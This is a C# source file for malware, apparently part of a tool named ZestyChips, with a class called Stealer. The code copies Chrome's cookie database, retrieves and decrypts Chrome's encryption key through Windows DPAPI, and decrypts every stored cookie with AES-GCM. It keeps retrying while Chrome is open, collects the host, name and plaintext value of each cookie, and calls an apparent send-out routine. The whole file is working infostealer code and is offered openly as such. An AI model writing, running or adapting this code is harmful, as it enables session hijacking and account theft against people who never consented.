using System;
using System.IO;
using System.Threading;
using System.Data.SQLite;
using System.Text.Json;
using System.Security.Cryptography;
using System.Linq;
using System.Text;
using System.Collections.Generic;
using System.Security.Cryptography.X509Certificates;

namespace ZestyChips
{
    internal class Stealer
    {
        /*
        * Main entrypoint for the stealer to begin..
        */
        public static void Start()
        {
            Program.SendBase64EncodedData("Hello from the stealer!"); // test case success

            // steal chrome data
            Chrome();
        }

        /*
        * stealer functions for Chrome
        */
        private static void Chrome() {
            bool flag = !File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies");
            string result;
            if (flag) {
                result = "Chrome not found";
                Program.SendBase64EncodedData(result);
            } else {
                Helpers.PrintInfo("Chrome found, copying..");
                for(;;) {
                    try {
                        // copy file to dest file name cc
                        // Helpers.PrintInfo(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies");
                        File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies", "cc", true);
                        break;
                    } catch (Exception ex) {
                        // exception will throw most likely if chrome is open
                        // implant will continually run until chrome is closed / process terminated
                        Helpers.PrintInfo("an error occurred copying cache: " + ex.Message);
                        Thread.Sleep(10000); // sleep 10 seconds
                    }
                }

                // open the Chrome cookies database
                SQLiteConnection sqliteConnection = new SQLiteConnection("Data Source=cc");
                sqliteConnection.Open();
                SQLiteCommand sqliteCommand = new SQLiteCommand("SELECT host_key, name, encrypted_value FROM cookies", sqliteConnection);
                SQLiteDataReader sdr = sqliteCommand.ExecuteReader();

                // decode & decrypt the encryption key
                while (sdr.Read()) {
                    byte[] rawEncryptedChromeRow = (byte[])sdr["encrypted_value"];
                    string localStateFileData = File.ReadAllText(Environment.GetEnvironmentVariable("APPDATA") + "/../Local/Google/Chrome/User Data/Local State");

                    // use native tools to pull out the encrypted encryption key used by Chrome
                    using JsonDocument doc = JsonDocument.Parse(localStateFileData);
                    string encryptedKey = doc.RootElement.GetProperty("os_crypt").GetProperty("encrypted_key").GetString();

#pragma warning disable CA1416
                    byte[] encryptionKey = ProtectedData.Unprotect(Convert.FromBase64String(encryptedKey).Skip(5).ToArray(), null, DataProtectionScope.LocalMachine);
#pragma warning restore CA1416

                    // decrypt encrypted data from chrome
                    using (MemoryStream memoryStream = new MemoryStream(rawEncryptedChromeRow)) {
                        using (BinaryReader binaryReader = new BinaryReader(memoryStream)) {
                            byte[] skippedBytes = binaryReader.ReadBytes(3); 

                            byte[] nonce = binaryReader.ReadBytes(12); // nonce for GCM
                            byte[] cipherTextWithTag = binaryReader.ReadBytes(rawEncryptedChromeRow.Length - 3 - 12); // remaining bytes are ciphertext plus tag

                            byte[] cipherText = new byte[cipherTextWithTag.Length - 16];
                            byte[] tag = new byte[16];
                            Array.Copy(cipherTextWithTag, 0, cipherText, 0, cipherText.Length);
                            Array.Copy(cipherTextWithTag, cipherText.Length, tag, 0, tag.Length);

                            byte[] decryptedData = new byte[cipherText.Length];

                            using (AesGcm aesGcm = new AesGcm(encryptionKey, tag.Length)) {
                                try {
                                    aesGcm.Decrypt(nonce, cipherText, tag, decryptedData);
                                    string decryptedString = Encoding.UTF8.GetString(decryptedData);

                                    // iterate through each row and store into our masterDictionary
                                    string key = sdr["host_key"].ToString();
                                    object value = sdr["name"];

                                    // if the key already exists in masterDictionary, append the new value; if not, add a new key-value pair.
                                    if (Program.masterDictionary.ContainsKey(key)) {
                                        Dictionary<string, string> dictionary2 = Program.masterDictionary;
                                        dictionary2[key] = string.Concat(new string[] {
                                            dictionary2[key],
                                            (value != null) ? value.ToString() : null,
                                            "=",
                                            decryptedString,
                                            "; "
                                        });
                                    } else {
                                        Program.masterDictionary.Add(key, ((value != null) ? value.ToString() : null) + "=" + decryptedString + "; ");
                                    }

                                    foreach (var pair in Program.masterDictionary)
                                    {
                                        Helpers.PrintInfo($"Key: {pair.Key}, Value: {pair.Value}");
                                    }
                                }
                                catch (Exception ex) {
                                    Helpers.PrintFail($"failed to decrypt data: {ex}");
                                    return;
                                }
                            }
                        }
                    }

                }
            }
        }
    }
}
